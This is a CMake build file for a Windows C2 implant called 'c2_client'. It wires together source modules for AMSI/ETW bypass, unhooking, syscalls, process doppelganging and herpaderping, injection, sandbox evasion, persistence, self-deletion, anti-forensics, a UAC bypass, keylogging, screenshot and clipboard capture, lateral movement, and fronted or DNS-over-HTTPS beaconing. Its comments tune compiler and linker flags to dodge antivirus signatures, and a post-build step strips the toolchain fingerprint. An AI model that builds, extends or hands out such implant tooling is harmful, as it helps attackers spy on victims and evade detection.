cmake_minimum_required(VERSION 3.20)
project(c2_client CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
# EncString uses consteval (C++20) so plaintext never lands in .rdata.

set(C2_LOADER "NONE" CACHE STRING "Loader mode: NONE, STOMP, APC, DOPPEL, HERPADERP")
set_property(CACHE C2_LOADER PROPERTY STRINGS NONE STOMP APC DOPPEL HERPADERP)
set(C2_PERSIST OFF CACHE BOOL "Enable persistence")
set(C2_SELF_DEL OFF CACHE BOOL "Enable self-deletion on exit")
# Opsec (off by default — network-first boot):
#   -DC2_EARLY_EVASION=ON  unhook/AMSI/ETW before first C2 contact (can break WinHTTP)
#   -DC2_SANDBOX_ABORT=ON  exit if sandbox heuristics fire
#   -DC2_HOST=... -DC2_PORT=... override primary transport profile
option(C2_EXTRA_PROFILES "Embed front/DoH/pipe transport profiles" OFF)
option(C2_SANDBOX_ABORT "Abort if sandbox detected" OFF)
set(C2_HOST_OVERRIDE "" CACHE STRING "Override C2_HOST in Config.h")
set(C2_PORT_OVERRIDE "" CACHE STRING "Override C2_PORT in Config.h")
set(C2_PSK_OVERRIDE "" CACHE STRING "Override C2_PSK in Config.h")

# --- target architecture: x64 only ---
if(NOT CMAKE_SIZEOF_VOID_P EQUAL 8)
    message(FATAL_ERROR "c2_client requires x64 (use -A x64 with the Visual Studio generator).")
endif()

add_executable(c2_client WIN32
    src/main.cpp

    src/core/Base64.cpp
    src/core/Crypto.cpp
    src/core/Transport.cpp
    src/core/Protocol.cpp
    src/core/Chunked.cpp
    src/core/Beacon.cpp

    src/evasive/ApiHash.cpp
    src/evasive/AsmStubs.cpp
    src/evasive/NtTypes.cpp
    src/evasive/Unhook.cpp
    src/evasive/Opsec.cpp
    src/evasive/Syscalls.cpp
    src/evasive/Loader.cpp
    src/evasive/AmsiEtw.cpp
    src/evasive/AntiAnalysis.cpp
    src/evasive/WmiQuery.cpp
    src/evasive/Strings.cpp
    src/evasive/HwbpClean.cpp
    src/evasive/MemGuard.cpp
    src/evasive/Obf.cpp
    src/evasive/ProcSpoof.cpp
    src/evasive/ContextSpoof.cpp
    src/evasive/Doppel.cpp
    src/evasive/Herpaderp.cpp
    src/evasive/SleepEkko.cpp
    src/evasive/StackSpoof.cpp
    src/evasive/Sandbox.cpp
    src/evasive/Inject.cpp

    src/persist/Install.cpp
    src/persist/SelfDel.cpp

    src/audit/Imports.cpp

    src/forensics/AntiForensics.cpp

    src/stage/Stage.cpp

    src/tasks/Runner.cpp
    src/tasks/Tokens.cpp
    src/tasks/UacBypass.cpp
    src/tasks/Keylogger.cpp
    src/tasks/Screenshot.cpp
    src/tasks/Clipboard.cpp
    src/tasks/Lateral.cpp

    src/transport/Profile.cpp
    src/transport/Malleable.cpp
    src/transport/HttpsTransport.cpp
    src/transport/FrontTransport.cpp
    src/transport/DohTransport.cpp
    src/transport/PipeTransport.cpp

    src/version.rc
)

target_include_directories(c2_client PRIVATE src)

target_compile_definitions(c2_client PRIVATE NOMINMAX)

if(C2_LOADER STREQUAL "STOMP")
    target_compile_definitions(c2_client PRIVATE C2_LOADER_MODE_STOMP)
elseif(C2_LOADER STREQUAL "APC")
    target_compile_definitions(c2_client PRIVATE C2_LOADER_MODE_APC)
elseif(C2_LOADER STREQUAL "DOPPEL")
    target_compile_definitions(c2_client PRIVATE C2_LOADER_MODE_DOPPEL)
elseif(C2_LOADER STREQUAL "HERPADERP")
    target_compile_definitions(c2_client PRIVATE C2_LOADER_MODE_HERPADERP)
endif()

if(C2_PERSIST)
    target_compile_definitions(c2_client PRIVATE C2_PERSIST_ENABLE)
endif()
if(C2_SELF_DEL)
    target_compile_definitions(c2_client PRIVATE C2_SELF_DEL_ENABLE)
endif()
if(C2_EARLY_EVASION)
    target_compile_definitions(c2_client PRIVATE C2_EARLY_EVASION)
endif()
if(C2_EXTRA_PROFILES)
    target_compile_definitions(c2_client PRIVATE C2_EXTRA_PROFILES)
endif()
if(C2_SANDBOX_ABORT)
    target_compile_definitions(c2_client PRIVATE C2_SANDBOX_ABORT)
endif()
if(C2_HOST_OVERRIDE)
    target_compile_definitions(c2_client PRIVATE "C2_HOST=\"${C2_HOST_OVERRIDE}\"")
endif()
if(C2_PORT_OVERRIDE)
    target_compile_definitions(c2_client PRIVATE "C2_PORT=${C2_PORT_OVERRIDE}")
endif()
if(C2_PSK_OVERRIDE)
    target_compile_definitions(c2_client PRIVATE "C2_PSK=\"${C2_PSK_OVERRIDE}\"")
endif()

target_link_libraries(c2_client PRIVATE
    bcrypt
    winhttp
    delayimp
    shlwapi
    iphlpapi
    user32
    gdi32
    advapi32
    ole32
    oleaut32
    wbemuuid
    shell32
)

if(MSVC)
    # Static CRT -> no vcredist DLL dependency
    set_property(TARGET c2_client PROPERTY MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")

    # /SUBSYSTEM:WINDOWS is set via WIN32 on add_executable; tighten flags:
    target_compile_options(c2_client PRIVATE
        /O2
        /GS              # stack cookies — dropping /GS- (common AV heuristic)
        /GL
        /EHs-c-
        /GR-
        /Zc:wchar_t
        /utf-8
        /wd4100 /wd4189
    )

    # Avoid /MERGE:.rdata=.text and /DYNAMICBASE:NO — both are common static
    # implant signatures. ASLR stays on; SleepEkko uses relative addresses.
    target_link_options(c2_client PRIVATE
        /Brepro
        /PDBALTPATH:_
        /DEBUG:NONE
        /DYNAMICBASE
        /HIGHENTROPYVA
        /NXCOMPAT
        /DELAYLOAD:winhttp.dll
    )

    set(CMAKE_ASM_MASM_FLAGS "${CMAKE_ASM_MASM_FLAGS} /nologo")

    # Strip Rich header by default (toolchain fingerprint).
    option(C2_STRIP_RICH "Run strip_rich.py on the built EXE" ON)
    if(C2_STRIP_RICH)
        find_program(Python_EXECUTABLE python)
        if(Python_EXECUTABLE)
            add_custom_command(TARGET c2_client POST_BUILD
                COMMAND ${Python_EXECUTABLE} ${CMAKE_CURRENT_SOURCE_DIR}/tools/strip_rich.py
                        $<TARGET_FILE:c2_client>
                COMMENT "Stripping DOS stub + Rich header")
        endif()
    endif()
endif()
